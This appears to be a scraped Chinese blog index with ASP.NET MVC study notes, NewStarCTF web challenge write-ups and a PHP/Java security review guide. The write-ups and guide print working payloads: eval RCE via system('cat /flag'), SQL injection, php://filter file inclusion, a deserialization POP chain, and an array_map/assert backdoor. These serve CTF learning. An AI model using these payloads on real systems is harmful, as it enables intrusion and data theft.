//循环创建3个li元素item.className = &#x27;item&#x27; // 设置元素的class属性item.innerText = `$&#123;i + 1&#125;` // 设置元素的innerText属性 (使用了模板字符串)list.appendChild(item) // 将创建好的元素添加到父节点&#125;// 将list添加到bodydocument.body.appendChild(list)\n\nJSON对象定义基本特点\n数据在键值对中（键名即属性名必须加双引号）\n数据由逗号分隔\n花括号保存对象\n方括号保存数组\n\nJSON可通过JavaScript进行解析，JSON的值可以是：数字 字符串 逻辑值 数组 对象 null\njson不能存储Date对象，如果需要则用字符串表示\nJSON.parse程序示例：◼ JSON.parse(text [, reviver]) ：将JSON格式字符串转换为JavaScript对象\n◼ 参数说明：\n\ntext：必需，一个有效的JSON字符串 (如格式不正确则解析会出错)\nreviver：可选，一个转换结果的函数， 将为对象的每个成员调用此函数\n\nlet jstr = &#x27;&#123;&quot;name&quot;:&quot;wust&quot;, &quot;url&quot;:&quot;www.wust.edu.cn&quot;,&quot;birthday&quot;:&quot;1898-11-21&quot;&#125;&#x27;;let obj = JSON.parse( jstr, function(key, value) &#123;\tif (key == &quot;birthday&quot;) &#123;\t\tlet diff = new Date() - new Date(value); //计算距今的毫秒数\t\tlet year = parseInt(diff / 1000 / 60 / 60 / 24 / 365); //相差的年数\t\treturn year;\t&#125;else&#123;        return value;    &#125;&#125;)console.log(jsonObj.birthday);\n\n二.MVC后台部分1.MVC基本概念：\nMVC:是一种体系结构模式，他将应用程序分成3个主要组件：**模型（Model）视图（View）和控制器（Controller）**\nMVC模式有助于实现关注点分离：\n关注点：输入逻辑 业务逻辑 UI逻辑\n\n2.MVC三个模块功能\n控制器C：处理浏览器的请求，决定如何调用业务层数据的增、删、改、查等业务操作，以及如何将结果返回给视图进行渲染。\n模型M：应用的实体类，用于在内存中暂时存储数据，并在数据变化时通知控制器。\n视图V：主要用来解析、处理、显示内容，并进行模板的渲染。\n\n3.MVC体系结构优点：◼ Controller与View完全分离(松耦合)，有利于前、后台分工合作\n◼ 一个Model可建立多个视图，满足用户不同需求\n◼ Model独立于视图，可移植到新的平台，代码重用高，易于维护\n◼ 表现层的性能可以优化到极致\n◼ 容易对界面逻辑进行单元测试\n◼ 非常强大的URL映射组件，非常干净的URL来建造应用\n◼ 有利于软件工程化管理\n4.MVC项目目录结构\n5.Razor基本概念和基本语法规则Razor概念Razor是一个视图模板引擎，它提供了优雅的方法将基于服务器的代码（如C#）嵌入到HTML页面中\nRazor语法规则\n◼ C# 代码封装于 @{ … } 中\n◼ 代码语句以分号结尾\n◼ 行内表达式（变量和函数）以 @ 开头\n◼ C# 代码对大小写敏感\n6.ViewData传值特点\nViewData是一个字典对象，用来从Controller向对应的View视图传值\nViewData只在当前请求中有效，生命周期和View相同，其值不能在多个请求中共享\n在重定向(新请求)后，ViewData存储的值将变为null\n使用ViewData值时必须进行合适的类型转换和建议空值检查\n\n7.TrmpData传值特点\nTempData也是一个字典对象，但是基于Session存储机制\nTempData用在多个Action间或页面重定向(Redirection)时传递共享数据\n但TempData存放的数据只一次访问中有效，一次访问完成后就会删除\nTempData用法和ViewData相同\n\n8.“新搭建基架的项目”时生成的一些内容：\n9.EF Core数据库迁移两个命令：① Add-Migration InitialCreate\n② Uppate-Database\n10.ORM的概念\nORM (Object Relation Mapping) 是对象&#x2F;关系映射，它将内存中的对象和数据库中的立映射关系\n\n11.ORM技术产生的背景原因◼ 面向对象开发方法是当今企业级应用主流开发方法。\n◼ 关系数据库是企业级应用永久存放数据的主流数据存储系统。\n◼ 对象和关系数据是业务实体两种表现形式：业务实体在内存中表现为对象(非持久化存储)，在数据库中表\n现为关系数据(持久化存储) 。\n◼ 需要一种技术实现二者间映射，以简化编程，提高系统效率 \n12.模型的一些DateType注解\n\n\nDataType类型值\n说明\n\n\n\nDataType.Currency\n表示货币值\n\n\nDataType.Date\n表示日期值\n\n\nDataType.EmailAddress\n表示电子邮件地址\n\n\nDataType.Multiline Text\n表示多行文本\n\n\nDataType.Password\n表示密码值\n\n\nDataType.Time\n表示时间值\n\n\nDataType.Url\n表示一个URL值\n\n\n13.模型的一些验证注解◼ [Required]：验证字段是否不为 null\n◼ [StringLength]：验证字符串属性值是否不超过指定的长度限制。\n◼ [Range]：验证属性值是否位于指定范围内。\n◼ [Compare]：验证模型中的两个属性是否匹配。\n◼ [RegularExpression]：验证 属性值是否与指定的正则表达式匹配。\n◼ [EmailAddress]：验证属性是否具有电子邮件格式。\n注：[DataType]：只是帮助字段进行格式设置，不提供任何验证\n14.控制器方法的两个注解◼ [HttpPost] 注解：表明只能由POST请求才能调用此Action方法，不写默认[HttpGet] (第一个Create就是GET)\n◼ [ValidateAntiForgeryToken] 注解：用于防止请求伪造 (更安全)\n15.强类型传值◼ 回顾：ViewData字典传值是一个弱类型传值方式 (使用时需要手工强转类型)\n◼ 强类型传值则不需要手工强转类型\n◼ 如何实现强类型传值：\n    ① 控制器在返回视图时，添加模型对象作为参数，即： return View(模型对象); \n\n    ② 在视图中，先使用 @model 指令声明模型对象类型\n\n    ③ 然后在视图中使用Model对象来接收传来的模型对象，之后使用Model对象无需强转\n\n16.控制器编程给出数据库表，以及模型类、数据库上下文类，查询所有记录或根据 id 查明细。控制器基本结构：\npublic class MoviesController : Controller&#123;private readonly MvcMovieContext _context;public MoviesController(MvcMovieContext context)&#123;_context = context;&#125;// …CRUD操作&#125;","categories":["学习"]},{"title":"NewStarCTF WEEK1 WEB","url":"/2022/10/07/NewStarCTF%20WEEK1%20WEB/","content":"1.HTTP\n进入题目发现要get name，我们猜测要用get的提交数据方式传一个值\nget传值公式为\n?+变量名+等于号（&#x3D;）+变量值\n题目中的“name”添加了单引号，猜测变量名为name传入\n?name&#x3D;1\n\n进入第二关，需要我们post一个key值，但我们不知道key\nF12进入开发者模式，html中藏了key值\n\n用post传参key&#x3D;ctfisgood（post传参不会显示到url上面，并且并不需要用问号（？）\n\n用bp传入key&#x3D;ctfisgood后，发现response说我们不是admin，\n我们看到cookie中显示user&#x3D;guest，改为user&#x3D;admin\n得到flag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}\n2.Head?Header!\n这里要我们将浏览器改为CTF，我们用bp抓一个包\n\n必须要求我们来自‘ctf.com’，这里用到了referer的知识点\n\nReferer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在www.google.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有：\nReferer=http://www.google.com\n\n由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer  信息。\n\nreferer知识点\n我们加一行\nreferer:ctf.com\n\n这里提示我们不是local，在php中有很多头能改来源常见的是X-Forward-For\nX-Forwarded-For知识点\n我们添加一行\nX-Fordward-For:127.0.0.1\n127.0.0.1就是本地地址\n\n得到flag{d0637815-c4fc-4aa4-a842-06ebfc22817b}\n3.我真的会谢\nflag放在三个地方，都是敏感文件\n一般常见的有\nrobots.txt .index.php.swp www.zip index.php~ 还有很多可以自行查询\n题目这里是robots.txt .index.php.swp www.zip\n\n\n得到flag\n正常情况下我们用dirsearch就可以扫出来，不过buu这里不支持\n4.NotPHP &lt;?phperror_reporting(0);highlight_file(__FILE__);if(file_get_contents($_GET[&#x27;data&#x27;]) == &quot;Welcome to CTF&quot;)&#123;    if(md5($_GET[&#x27;key1&#x27;]) === md5($_GET[&#x27;key2&#x27;]) &amp;&amp; $_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;])&#123;        if(!is_numeric($_POST[&#x27;num&#x27;]) &amp;&amp; intval($_POST[&#x27;num&#x27;]) == 2077)&#123;            echo &quot;Hack Me&quot;;            eval(&quot;#&quot;.$_GET[&#x27;cmd&#x27;]);        &#125;else&#123;            die(&quot;Number error!&quot;);        &#125;    &#125;else&#123;        die(&quot;Wrong Key!&quot;);    &#125;&#125;else&#123;    die(&quot;Pass it!&quot;);&#125; Pass it!\n\n是一道php代码审计题目一共有四关\n第一关\nif(file_get_contents($_GET[&#x27;data&#x27;]) == &quot;Welcome to CTF&quot;)\n\n这里给出相关知识点file_get_contents相关知识点\nphp伪协议\n这里我们用data协议写入\n?data=data://text/plain,Welcome to CTF\n\n接着第二关\n要求我们if(md5($_GET[&#x27;key1&#x27;]) === md5($_GET[&#x27;key2&#x27;]) &amp;&amp; $_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;])\n\n这里要求key1和key2的md5值相同但key1和key2不相等，乍一看觉得很奇怪，但其实md5可以绕过\nmd5绕过\n当我们让key1和key2为数组的时候，md5加密后，结果均为0，则0&#x3D;&#x3D;&#x3D;0成立\nkey1[]=1&amp;key2[]=2\n\n第三关\nif(!is_numeric($_POST[&#x27;num&#x27;]) &amp;&amp; intval($_POST[&#x27;num&#x27;]) == 2077)\n\nis_numeric函数用来判断是否为数字\nintval() 函数用于获取变量的整数值。\n这里我们需要让num不是数字但让num&#x3D;2077，这里需要注意这里用到的是&#x3D;&#x3D;\n这是弱类型比较，则我们传入num&#x3D;2077a\nnum=2077a\n\nintval(2077a)&#x3D;2077可以在自己实验一下\n第四关\neval(&quot;#&quot;.$_GET[&#x27;cmd&#x27;]);\n\n简单的rce，难点在于这个#注释\n有两种绕过方式\n1.?&gt;让前面闭合\n2.%0a用换行来绕过\n经测试发现空格被过滤 我这利用%20绕过，还有许多绕过方式，自行搜索\n&amp;cmd=%0asystem(&#x27;cat%20/flag&#x27;);\n\n&amp;cmd=?&gt;&lt;?system(&#x27;cat%20/flag&#x27;);\n\n得到flag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}\n5.Word-For-You\n看着像sql注入猜一波万能密码\n1&#x27; or 1=1#\n\n\n直接出，这里给一个sql注入学习链接\nsql注入\n\n\n\n\n第一周做完了，题目还算比较简单，这段时间充实下自己吧\n","categories":["复现"]},{"title":"NewStarCTF WEEK2 WEB","url":"/2022/10/10/NewStarCTF%20WEEK2%20WEB/","content":"NewStarCTF WEEK2 WEB1.Word-For-You(2 Gen)首先我们来试一下万能密码\n1&#x27; or 1=1#\n\n\n发现没有什么用，我们尝试一下报错注入\n\n这里爆出了库名~wfy，说明我们可以利用报错注入，接着我们爆列表\n这里一共爆了三个列表\nXPATH syntax error: &#x27;~wfy_admin,wfy_comments,wfy_info&#x27;    \n\n这里我们都试了一遍，发现flag在wfy_comments里面，我们查一下里面\n1’||updatexml(1,concat(0x7e,(select reverse(group_concat(text)) from wfy_comments)),1)#\n\nXPATH syntax error: &#x27;~&#125;sr0rre_emos_ek2m_t4uJ&#123;galf,难&#x27;    //得到逆序flag\n\n\n\n2.IncludeOne题目源代码：\n &lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;seed.php&quot;);//mt_srand(*********);//设置随机数种子echo &quot;Hint: &quot;.mt_rand().&quot;&lt;br&gt;&quot;;//已知第一个随机数种子为：1219893521if(isset($_POST[&#x27;guess&#x27;]) &amp;&amp; md5($_POST[&#x27;guess&#x27;]) === md5(mt_rand()))&#123;//md5强类型    if(!preg_match(&quot;/base|\\.\\./i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp;//过滤base preg_match(&quot;/NewStar/i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;file&#x27;]))&#123;       //要求存在NewStar字符串，并且有file参数        //flag in `flag.php`        include($_GET[&#x27;file&#x27;]);//文件包含漏洞    &#125;else&#123;        echo &quot;Baby Hacker?&quot;;    &#125;&#125;else&#123;    echo &quot;No Hacker!&quot;;&#125; Hint: 1219893521No Hacker!\n\n题目这里给了一个链接：https://www.openwall.com/php_mt_seed/\n这里大概讲的就是随机数种子的漏洞\n当我们知道随机数种子后，后面的随机数无论在哪里运行都是有可预见性的\n&lt;?php  mt_srand(12345);    echo mt_rand().&quot;&lt;br/&gt;&quot;;echo mt_rand().&quot;&lt;br/&gt;&quot;;echo mt_rand().&quot;&lt;br/&gt;&quot;;echo mt_rand().&quot;&lt;br/&gt;&quot;;echo mt_rand().&quot;&lt;br/&gt;&quot;;?&gt;    16294643924716173214630942641878061366394962642\n\n当随机数种子设置成12345时，前五个随机数都是一样的，于是这个题目就有了思路，我们已知第一个随机数，可以用工具爆破出种子，然后我们用种子读第二个随机数，然后文件读取\n\n这里爆出随机数种子为1145146\n我们用种子去跑第二个随机数：1202031004\n然后post传值\n接着就是文件包含，这题过滤了base我们可以用rot13编码（编码的形式有许多种）\n?file=php://filter/read=string.rot13/resource=flag.php\n\n我发现这题必须要包含NewStar这个字符串，于是我们改成\n?file=php://filter/NewStar/read=string.rot13/resource=flag.php\n\nsynt&#123;p1786p1p-rqr8-4524-n796-r3s84050oo92&#125;\n\nrot13解码得\nflag&#123;c1786c1c-ede8-4524-a796-e3f84050bb92&#125;\n\n3.UnserializeOne源代码：\n &lt;?phperror_reporting(0);highlight_file(__FILE__);#Something useful for you : https://zhuanlan.zhihu.com/p/377676274class Start&#123;    public $name;    protected $func;    public function __destruct()    &#123;        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;    &#125;    public function __isset($var)    &#123;        ($this-&gt;func)();    &#125;&#125;class Sec&#123;    private $obj;    private $var;    public function __toString()    &#123;        $this-&gt;obj-&gt;check($this-&gt;var);        return &quot;CTFers&quot;;    &#125;    public function __invoke()    &#123;        echo file_get_contents(&#x27;/flag&#x27;);    &#125;&#125;class Easy&#123;    public $cla;    public function __call($fun, $var)    &#123;        $this-&gt;cla = clone $var[0];    &#125;&#125;class eeee&#123;    public $obj;    public function __clone()    &#123;        if(isset($this-&gt;obj-&gt;cmd))&#123;            echo &quot;success&quot;;        &#125;    &#125;&#125;if(isset($_POST[&#x27;pop&#x27;]))&#123;    unserialize($_POST[&#x27;pop&#x27;]);&#125;\n\n这个题目是考反序列化，利用点为\necho file_get_contents(&#x27;/flag&#x27;);\n\n\n __construct()，类的构造函数\n__destruct()，类的析构函数\n__call()，在对象中调用一个不可访问方法时调用\n__callStatic()，用静态方式中调用一个不可访问方法时调用\n__get()，获得一个类的成员变量时调用\n__set()，设置一个类的成员变量时调用\n__isset()，当对不可访问属性调用isset()或empty()时调用\n__unset()，当对不可访问属性调用unset()时被调用。\n__sleep()，执行serialize()时，先会调用这个函数\n__wakeup()，执行unserialize()时，先会调用这个函数\n__toString()，类被当成字符串时的回应方法\n__invoke()，调用函数的方式调用一个对象时的回应方法\n__set_state()，调用var_export()导出类时，此静态方法会被调用。\n__clone()，当对象复制完成时调用\n__autoload()，尝试加载未定义的类\n__debugInfo()，打印所需调试信息\n\n这题目找pop链，一般我从**__destruct开始，链终点是Sec类中的__invoke**\npublic function __destruct()    &#123;        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;    &#125;\n\n如果我们将这里的name改成类，由于echo会将类当成字符串可以触发**__tostring**\n我们将Start类中的name设置为Sec类\npublic function __toString()    &#123;        $this-&gt;obj-&gt;check($this-&gt;var);        return &quot;CTFers&quot;;    &#125;\n\n由于这里的check方法没有被定义则会触发**__call**\n我们将Sec中的obj设置为Easy类\npublic function __call($fun, $var)    &#123;        $this-&gt;cla = clone $var[0];    &#125;\n\n我们将Easy钟大哥cla设置为eeee类会触发**__clone**\npublic function __clone()    &#123;        if(isset($this-&gt;obj-&gt;cmd))&#123;            echo &quot;success&quot;;        &#125;    &#125;\n\n由于eeee类中没有cm’d属性，这里调用会触发**__isset**\n我们将eeee中的obj设置为Start类\npublic function __isset($var)    &#123;        ($this-&gt;func)();    &#125;\n\n这里的 ($this-&gt;func)();可以出发__invoke\n我们将Start中的func改为Sec类即可出发成功\npublic function __invoke()    &#123;        echo file_get_contents(&#x27;/flag&#x27;);    &#125;\n\npop链\n&lt;?php//error_reporting(0);//highlight_file(__FILE__);#Something useful for you : https://zhuanlan.zhihu.com/p/377676274class Start&#123;    public $name;    public $func;    public function __construct()&#123;        $this-&gt;func=new Sec();        $this-&gt;name=new Sec();    &#125;    public function __destruct()    &#123;        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;    &#125;    public function __isset($var)    &#123;        ($this-&gt;func)();    &#125;&#125;class Sec&#123;    public $obj;    public $var;    public function __construct()&#123;        $this-&gt;obj=new Easy();    &#125;    public function __toString()    &#123;        $this-&gt;obj-&gt;check($this-&gt;var);        return &quot;CTFers&quot;;    &#125;    public function __invoke()    &#123;        echo file_get_contents(&#x27;/flag&#x27;);    &#125;&#125;class Easy&#123;    public $cla;    public function __call($fun, $var)    &#123;        $this-&gt;cla = clone $var[0];    &#125;&#125;class eeee&#123;    public $obj;        public function __clone()    &#123;        if(isset($this-&gt;obj-&gt;cmd))&#123;            echo &quot;success&quot;;        &#125;    &#125;&#125;$c=new eeee();$a=new Start();$c-&gt;obj=$a;$b=new Sec();$b-&gt;var=$c;$a-&gt;name=$b;echo serialize($c);\n\n?pop=O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;r:1;&#125;s:4:&quot;func&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;N;&#125;&#125;&#125;\n\n4.ezAPI进去后访问www.zip获取源码\n&lt;html&gt;    &lt;body&gt;        &lt;center&gt;            &lt;h1&gt;Search Page&lt;/h1&gt;&lt;br&gt;            &lt;hr&gt;&lt;br&gt;            &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;            请输入用户ID:             &lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;            &lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt;            &lt;/form&gt;&lt;?phperror_reporting(0);$id = $_POST[&#x27;id&#x27;];function waf($str)&#123;    if(!is_numeric($str) || preg_replace(&quot;/[0-9]/&quot;,&quot;&quot;,$str) !== &quot;&quot;)&#123;#判断是否为数字字符串如果不是或者如果替换掉里的数字不为空就返回False,需要全部都不满足        return False;    &#125;else&#123;        return True;    &#125;&#125;function send($data)&#123;    $options = array(        &#x27;http&#x27; =&gt; array(            &#x27;method&#x27; =&gt; &#x27;POST&#x27;,            &#x27;header&#x27; =&gt; &#x27;Content-type: application/json&#x27;,            &#x27;content&#x27; =&gt; $data,            &#x27;timeout&#x27; =&gt; 10 * 60        )    );    $context = stream_context_create($options);    $result = file_get_contents(&quot;http://graphql:8080/v1/graphql&quot;, false, $context);    return $result;&#125;if(isset($id))&#123;    if(waf($id))&#123;        isset($_POST[&#x27;data&#x27;]) ? $data=$_POST[&#x27;data&#x27;] : $data=&#x27;&#123;&quot;query&quot;:&quot;query&#123;\\nusers_user_by_pk(id:&#x27;.$id.&#x27;) &#123;\\nname\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;&#x27;;        $res = json_decode(send($data));        if($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL)&#123;            echo &quot;ID: &quot;.$id.&quot;&lt;br&gt;Name: &quot;.$res-&gt;data-&gt;users_user_by_pk-&gt;name;        &#125;else&#123;            echo &quot;&lt;b&gt;Can&#x27;t found it!&lt;/b&gt;&lt;br&gt;DEBUG: &quot;;            var_dump($res-&gt;data);        &#125;    &#125;else&#123;        die(&quot;&lt;b&gt;Hacker!&lt;/b&gt;&quot;);    &#125;&#125;else&#123;    die(&quot;&lt;b&gt;No Data?&lt;/b&gt;&quot;);&#125;?&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;\n\n这里给一篇graphQL的资料\nhttps://blog.csdn.net/wy_97/article/details/110522150\n如果我们post了一个data，就不会执行后面的文件，我们查看graphQL的api后能完全控制语句\n用内省查询获取所以数据\nid=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\\n  __schema &#123;\\n  types &#123;\\n name  \\n &#125;\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;\n\n\nid=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;ffffllllaaagggg_1n_h3r3_flag &#123;flag&#125;&#125;&quot;,&quot;variables&quot;:null&#125;\n\nflag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;","categories":["复现"]},{"title":"PHP / JAVA复习指南","url":"/2022/11/03/PHP%20%20JAVA%E5%A4%8D%E4%B9%A0%E6%8C%87%E5%8D%97/","content":"PHP &#x2F; JAVA复习指南PHP1.php 命令执行函数以及函数应用场景\nsystem() 将字符串作为OS命令执行，自带输出功能。\npassthru()将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。\nexec()将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。\nshell_exec 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容\npopen()/proc_open()该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。需要用**fread**来读\n反引号  [&#96;&#96;]反引号里面的代码也会被当作OS命令来执行\n\n2.php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php.ini中进行怎样的配置？php封装协议又称为伪协议，主要分为以下几种：\n\nfile://  file:&#x2F;&#x2F; 用于访问本地文件系统它在双off的情况下也可以正常使用；allow_url_fopen ：off&#x2F;on allow_url_include：off&#x2F;on\n\nphp://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了在双off的情况下也可以正常使用；\n\nphp://input 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据allow_url_fopen ：off&#x2F;on\nallow_url_include：on\n\nzip:// compress.bzip:// compress.zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。双off也能用\n\ndata:// 数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。必须要双on才可以\n\nphar:/&#x2F; 反序列化有时会用到 与zip协议不同的是zip协议为绝对路径，而phar协议为相对路径\n\n\n3.代码执行函数\npreg_replace() 在php 5.6及之前的版本，当第一个参数在 &#x2F;e 的修饰下，并且 magic_quotes_gpc&#x3D;Off 时，函数的第二个参数会被当做php代码执行\n&lt;?php\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&#x27; . $_GET[&#x27;reg&#x27;], &#x27;\\\\1&#x27; ,&#x27;&lt;php&gt;phpinfo()&lt;php&gt;&#x27;);\tpreg_replace(&#x27;/anything/e&#x27;, $_GET[&#x27;test&#x27;], &#x27;anything_test&#x27;);\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&lt;\\/php&gt;/e&#x27;, &#x27;\\\\1&#x27;, $_GET[&#x27;test&#x27;]);\n\narray_map() 第一个参数是回调函数，第二参数是函数的参数\n&lt;?php    $func=$_GET[&#x27;func&#x27;];    $cmd=$_POST[&#x27;cmd&#x27;];    $array[0]=$cmd;    $new_array=array_map($func,$array);    echo $new_array;?&gt;//    命令执行http://localhost/123.php?func=system   cmd=whoami //   菜刀连接http://localhost/123.php?func=assert   密码：cmd\n\n\n\nassert() 判断一个表达式是否成立，能够把字符组成的字符串，当作代码执行。\n\nassert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾（特别注意），有时加上分号不会显示结\n\n\n\n4.php 中常见的文件读取&#x2F;写入函数共有9个文件读取函数\nfile_get_contents   // *freadfgetsfgetssfileparse_ini_filereadfile    // *highlight_file  // *show_source // *\n\n使用方法\n&lt;?php// file_get_contentsprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;file_get_contents&#x27;).PHP_EOL);echo file_get_contents(&#x27;flag.txt&#x27;);echo PHP_EOL;// fopen freadprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;fopen fread&#x27;).PHP_EOL);$file = fopen(&quot;flag.txt&quot;,&quot;rb&quot;);echo fread($file,1024);     // 参数为 resource 类型fclose($file);echo PHP_EOL;// fopen fgetsprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;fopen fgets&#x27;).PHP_EOL);$file = fopen(&quot;flag.txt&quot;,&quot;r&quot;);      echo fgets($file, 4096);        // 过滤掉了 HTML 和 PHP 标签fclose($file);echo PHP_EOL;// fopen fgetssprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;fopen fgetss&#x27;).PHP_EOL);$file = fopen(&quot;flag.txt&quot;,&quot;r&quot;);     echo fgetss($file, 4096);        // 过滤掉了 HTML 和 PHP 标签fclose($file);echo PHP_EOL;// readfileprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;readfile&#x27;).PHP_EOL);echo readfile(&quot;flag.txt&quot;);      // 看到不仅输出了所有内容，而且还输出了总共长度echo PHP_EOL;// fileprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;file&#x27;).PHP_EOL);print_r(file(&#x27;flag.txt&#x27;));      // 读取结果为数组，所以需要用 print_r 或 var_dump echo PHP_EOL;// parse_ini_fileprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;parse_ini_file&#x27;).PHP_EOL);echo parse_ini_file(&quot;flag.txt&quot;);        // 只能读取 ini 配置文件echo PHP_EOL;// show_sourceprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;show_source&#x27;).PHP_EOL);show_source(&#x27;flag.txt&#x27;);echo PHP_EOL;// highlight_fileprint(sprintf(&quot;%&#x27;-10s%-&#x27;-30s&quot;, &#x27;-&#x27;, &#x27;highlight_file&#x27;).PHP_EOL);highlight_file(&#x27;flag.txt&#x27;);echo PHP_EOL;?&gt;\n\n在PHP中使用 fweite() 和file_put_contents()函数向文件中写入数据。\n&lt;?php$file = fopen(&quot;test.txt&quot;,&quot;w&quot;);echo fwrite($file,&quot;Hello World. Testing!&quot;);fclose($file);?&gt;&lt;?phpecho file_put_contents(&quot;test.txt&quot;,&quot;Hello World. Testing!&quot;);?&gt;\n\n\n\n5.php 文件包含方法以及区别\ninclude\n&lt;?php include &#x27;test.php&#x27;;?&gt;\n\ninclude_once  可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题\n\nrequire 与include方法基本一样\n\nrequire_once   require_once 语句时会先检查要包含的文件是不是已经在该程序中的其他地方被包含过，如果有，则不会再次重复包含该文件\n\n\n区别\n\n1、include如果碰到错误，会给出提示，并继续向下执行；而require会终止程序执行。2、require_once和include_once中如果包含的文件已经被包含过，就不会再次包含，但include和require会。\n\n6.php反序列化漏洞涉及函数\nserialize()  序列化：把对象转化为二进制的字符串\n\nunserialize() 反序列化：把对象转化的二进制字符串再转化为对象\n\n魔术方法 可能在某些情况下自动调用\n1.__construct()，类的构造函数2.__destruct()，类的析构函数3.__call()，在对象中调用一个不可访问方法时调用4.__callStatic()，用静态方式中调用一个不可访问方法时调用5.__get()，获得一个类的成员变量时调用6.__set()，设置一个类的成员变量时调用7.__isset()，当对不可访问属性调用isset()或empty()时调用8.__unset()，当对不可访问属性调用unset()时被调用。9.__sleep()，执行serialize()时，先会调用这个函数10.__wakeup()，执行unserialize()时，先会调用这个函数11.__toString()，类被当成字符串时的回应方法12.__invoke()，调用函数的方式调用一个对象时的回应方法13.__set_state()，调用var_export()导出类时，此静态方法会被调用。14.__clone()，当对象复制完成时调用15.__autoload()，尝试加载未定义的类16.__debugInfo()，打印所需调试信息\n\n7.php 常见数组及引用\n$_GET 预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。\n从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制\n\n$POST预定义的 $_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。\n从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。\n\n$_REQUEST 既可以接收$_GET又可以接收$POST的值\n\n$_FILES 上传文件信息\n\n$_COOKIE用于获取 cookie 的值。\n\n$SESSION读取Session变量信息\n\n\nJAVA1.Web服务器常见的java EE web服务器\ntomcat   jetty  resin\n专业级java EE web 服务器\nJBOSS   GlassFish   Weblogic   Webshpere\n常见漏洞\nhttps://zhuanlan.zhihu.com/p/399939177\n2.tomcat目录结构与功能\nbin:目录里主要是有启动和关闭应用服务器的bat批处理命令；\nconf:这个目录里主要是支持配置Tomcat的文件。\nlib:这里面是支持Tomcat启动的jar包，当然也可以放你自己项目需要的jar包。\ntemp:Tomcat运行过程中产生的临时文件。\nwebapps:这里就是你的项目了，你的项目可以是以文件或者jar包的方式存放在这个目录里。\nwork：work目录用来存放tomcat在运行时的编译后文件，例如JSP编译后的文件。\n\n3.tomcat中web.xml 与 tomcat_user.xml 的作用web.xmlTomcat可以让用户通过将缺省的web.xml放入conf目录中来定义所有关系环境的web.xml的缺省值.建立一个新的关系环境时,Tomcat使用缺省的web.xml文件作为基本设置和应用项目特定的web.xml(放在应用项目的WEB-INF&#x2F;web.xml文件)来覆盖这些缺省值.是配置整个tomcat的jsp和servlet工作中的一些情况,比如我们配置list来不让我们输入一个目录的时候显示出那个目录下的jsp文件,而是显示404错误.还有在一些安全方面也可以做配置.\ntomcat-users.xml 配置tomcat的用户了信息.可以到tomcat的开始页http://localhost:8080中点tomcat manager就会提示你要用户名和密码了,这里的用户名和密码就可以在这个xml中配置的\n4.什么是jsp\nJSP全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以&lt;%开头以%&gt;结束。\nJSP是一种Java 